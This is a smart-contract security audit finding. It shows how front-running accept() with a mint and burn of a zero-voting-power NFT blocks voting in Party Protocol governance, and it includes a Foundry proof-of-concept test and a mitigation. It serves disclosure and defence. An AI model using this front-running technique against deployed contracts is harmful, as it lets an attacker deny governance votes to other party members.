# Burning an NFT can be used to block voting

## Impact

A new validation in the `accept()` function has been introduced in order to mitigate a potential attack to the party governance.

By burning an NFT, a party member can reduce the total voting power of the party just before creating a proposal and voting for it. Since the snapshot used to vote is previous to this action, this means the user can still use their burned voting power while voting in a proposal with a reduced total voting power. This is stated in the comment attached to the new validation:

https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernance.sol#L589-L598

```solidity
589:         // Prevent voting in the same block as the last burn timestamp.
590:         // This is to prevent an exploit where a member can burn their card to
591:         // reduce the total voting power of the party, then propose and vote in
592:         // the same block since `getVotingPowerAt()` uses `values.proposedTime - 1`.
593:         // This would allow them to use the voting power snapshot just before
594:         // their card was burned to vote, potentially passing a proposal that
595:         // would have otherwise not passed.
596:         if (lastBurnTimestamp == block.timestamp) {
597:             revert CannotRageQuitAndAcceptError();
598:         }
```

This change can be abused by a bad actor in order to DoS the voting of a proposal. The call to `accept()` can be front-runned with a call to `burn()` that would trigger the revert in the original transaction.

While this is technically possible, it is not likely that a party member would burn their NFT just to DoS a voting for a single block. However, it might be possible to mint an NFT with zero voting power (in order to keep the voting power unaltered) and burn it in order to block calls to `accept()`.

## Proof of concept

The following test reproduces the issue. Bob's transaction to `accept()` is front-runned and blocked by minting a zero voting power NFT and immediately burning it.

Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/9a9868c7c3f540811eff6853db14bfc6).

```solidity
function test_PartyGovernanceNFT_BlockVoting() external {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address authority = makeAddr("authority");

    (Party party, , ) = partyAdmin.createParty(
        partyImpl,
        PartyAdmin.PartyCreationMinimalOptions({
            host1: address(this),
            host2: address(0),
            passThresholdBps: 5100,
            totalVotingPower: 100,
            preciousTokenAddress: address(toadz),
            preciousTokenId: 1,
            rageQuitTimestamp: 0,
            feeBps: 0,
            feeRecipient: payable(0)
        })
    );

    vm.prank(address(party));
    party.addAuthority(authority);

    // Mint voting power to alice and bob
    vm.startPrank(address(partyAdmin));

    uint256 aliceToken = party.mint(alice, 50, alice);
    uint256 bobTokenId = party.mint(bob, 50, bob);

    vm.stopPrank();

    // Alice creates proposal
    vm.startPrank(alice);

    uint256 proposalId = party.propose(
        PartyGovernance.Proposal({
            maxExecutableTime: uint40(type(uint40).max),
            cancelDelay: uint40(1 days),
            proposalData: abi.encode(0)
        }),
        0
    );

    vm.stopPrank();

    // Bob is going to vote for proposal but is front-runned by authority to block voting
    // Authority mints a 0 voting token and burns it
    vm.prank(authority);
    uint256 dummyTokenId = party.mint(authority, 0, authority);
    vm.prank(authority);
    party.burn(dummyTokenId);
    // Bob transaction reverts
    vm.expectRevert(PartyGovernance.CannotRageQuitAndAcceptError.selector);
    vm.prank(bob);
    party.accept(proposalId, 0);
}
```

## Recommendation

It is difficult to provide a solution without changing how voting works at the general level in the governance contracts. The issue can be partially mitigated by moving the check to the `proposal()` function. This would prevent the DoS on the `accept()` function while still mitigating the original issue, but would allow the same attack to be performed while members try to create proposals.
